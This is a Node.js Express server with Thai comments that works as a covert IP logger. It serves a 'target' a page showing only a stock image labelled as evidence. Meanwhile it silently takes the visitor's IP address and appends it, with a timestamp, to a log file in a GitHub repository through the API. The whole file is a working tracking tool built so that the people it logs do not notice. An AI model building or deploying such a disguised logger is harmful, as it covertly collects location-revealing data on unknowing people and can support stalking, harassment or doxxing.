require('dotenv').config(); // เพิ่มบรรทัดนี้ไว้บนสุดเพื่อเรียกใช้ไฟล์ .env เจี๊ยก เจี๊ยก
const express = require('express');
const axios = require('axios');
const app = express();

// --- ดึง Token จากตัวแปรสภาพแวดล้อมแทนการพิมพ์ลงไปตรงๆ เจี๊ยก เจี๊ยก ---
const GITHUB_TOKEN = process.env.GITHUB_TOKEN; 
const GITHUB_REPO = 'Thanapollekk/Tcsd_ip';
const FILE_PATH = 'IP Log.txt'; 
const IMAGE_URL = 'https://raw.githubusercontent.com/Thanapollekk/Tcsd_ip/main/iStock-997048534.jpg';
// ------------------------------------

// เมื่อเป้าหมายเข้ามาที่เว็บไซต์
app.get('/', async (req, res) => {
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    console.log(`พบการเชื่อมต่อจาก IP: ${ip} เจี๊ยก เจี๊ยก`);

    res.send(`
        <!DOCTYPE html>
        <html lang="th">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>แสดงรูปภาพเป้าหมาย</title>
            <style>
                body { display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #2c3e50; }
                .image-container { background-color: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
                img { max-width: 100%; height: auto; border-radius: 5px; }
            </style>
        </head>
        <body>
            <div class="image-container">
                <img src="${IMAGE_URL}" alt="รูปภาพหลักฐาน">
            </div>
        </body>
        </html>
    `);

    try {
        const time = new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' });
        const logEntry = `[${time}] สรุป IP: ${ip}\n`;
        
        const getUrl = `https://api.github.com/repos/${GITHUB_REPO}/contents/${FILE_PATH}`;
        let sha = '';
        let currentContent = '';

        try {
            const { data } = await axios.get(getUrl, {
                headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
            });
            sha = data.sha;
            currentContent = Buffer.from(data.content, 'base64').toString('utf-8');
        } catch (e) {
            // ปล่อยผ่านถ้ายังไม่มีไฟล์ เจี๊ยก เจี๊ยก
        }

        const newContent = Buffer.from(currentContent + logEntry).toString('base64');
        
        await axios.put(getUrl, {
            message: 'เพิ่มประวัติการเข้าชม IP ใหม่',
            content: newContent,
            sha: sha || undefined
        }, {
            headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
        });

    } catch (error) {
        console.error('เกิดข้อผิดพลาดในการบันทึก GitHub:', error.response ? error.response.data : error.message);
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`เซิร์ฟเวอร์สืบสวนพร้อมทำงานที่พอร์ต ${PORT} เจี๊ยก เจี๊ยก`);
});
